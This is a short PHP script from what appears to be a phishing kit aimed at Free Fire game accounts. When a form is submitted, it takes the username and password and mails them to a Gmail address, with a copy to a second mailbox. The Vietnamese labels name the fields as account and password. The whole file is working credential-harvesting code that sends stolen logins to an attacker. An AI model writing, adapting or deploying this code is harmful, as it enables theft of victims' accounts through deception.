<?php
if(isset($_POST['username']) && isset($_POST['password'])){
function guimail($email){
        $to  = $email;
    $subject = "Account FREE FIRE ".$_POST['username']."";
    $message = '
    Tài khoản: '.$_POST['username'].'
    Mật khẩu: '.$_POST['password'];
    $header  =  "From:pvtk@vhn.webstarterz.com \r\n";
    $header .=  "Cc:pvtk@vhn.webstarterz.com \r\n";

    $success = mail ($to,$subject,$message,$header);
 }
 guimail("vohuunhananony@gmail.com");
} else {
    echo 'Vui lòng nhập đầy đủ thông tin';
}
?>